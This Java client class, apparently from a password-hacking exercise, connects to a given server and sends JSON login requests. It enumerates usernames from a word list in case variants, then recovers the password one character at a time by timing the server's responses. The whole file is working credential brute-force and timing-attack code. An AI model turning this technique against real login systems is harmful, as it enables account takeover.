package hacker;

import com.google.gson.GsonBuilder;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Collection;

import static hacker.LoginDatabaseReader.getStringStream;
import static hacker.Result.SUCCESS;
import static hacker.Result.WRONG_PASSWORD;

public class ClientSocket {

    public void sendMessage(String[] strings) {
        var host = strings[0];
        var port = Integer.parseInt(strings[1]);
        try (Socket socket = new Socket(host, port);
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
            var gson = new GsonBuilder().setPrettyPrinting().create();
            var matchedLogin = getStringStream()
                    .map(WordCaseGenerator::generateCases)
                    .flatMap(Collection::stream)
                    .filter(login -> {
                        try {
                            var requestJson = gson.toJson(new LoginRequest(login, "qwerty"));
                            output.writeUTF(requestJson);
                            var responseJson = input.readUTF();
                            var response = gson.fromJson(responseJson, ResultResponse.class);
                            return response.result().equals(WRONG_PASSWORD.getResult());
                        } catch (IOException e) {
                            System.out.println("something went wrong");
                            return false;
                        }
                    })
                    .findFirst();

            var password = new StringBuilder();
            var response = "";

            while (!response.equals(SUCCESS.getResult())) {
                for (char ch : "abcdefghijklmnopqrstuvwxyz0123456789".toCharArray()) {
                    password.append(ch);
                    var requestJson = gson.toJson(new LoginRequest(matchedLogin.orElse(""), password.toString()));
                    var time = System.nanoTime();
                    output.writeUTF(requestJson);
                    var responseJson = input.readUTF();
                    var latency = System.nanoTime() - time;
                    var resultResponse = gson.fromJson(responseJson, ResultResponse.class);
                    response = resultResponse.result();

                    if (response.equals(SUCCESS.getResult())) {
                        break;
                    }

                    if (latency > 100_000_000) {
                        break;
                    }

                    if (response.equals(WRONG_PASSWORD.getResult())) {
                        password.deleteCharAt(password.length() - 1);

                        if (ch >= 'a' && ch <= 'z') {
                            password.append(Character.toUpperCase(ch));
                            requestJson = gson.toJson(new LoginRequest(matchedLogin.orElse(""), password.toString()));
                            time = System.nanoTime();
                            output.writeUTF(requestJson);
                            responseJson = input.readUTF();
                            latency = System.nanoTime() - time;
                            resultResponse = gson.fromJson(responseJson, ResultResponse.class);
                            response = resultResponse.result();

                            if (latency > 100_000_000) {
                                break;
                            }
                            if (response.equals(WRONG_PASSWORD.getResult())) {
                                password.deleteCharAt(password.length() - 1);
                            }
                        }
                    }
                }
            }
            var answer = gson.toJson(new LoginRequest(matchedLogin.orElse(""), password.toString()));
            System.out.println(answer);
        } catch (IOException e) {
            System.out.println(e.getMessage());
        }
    }
}
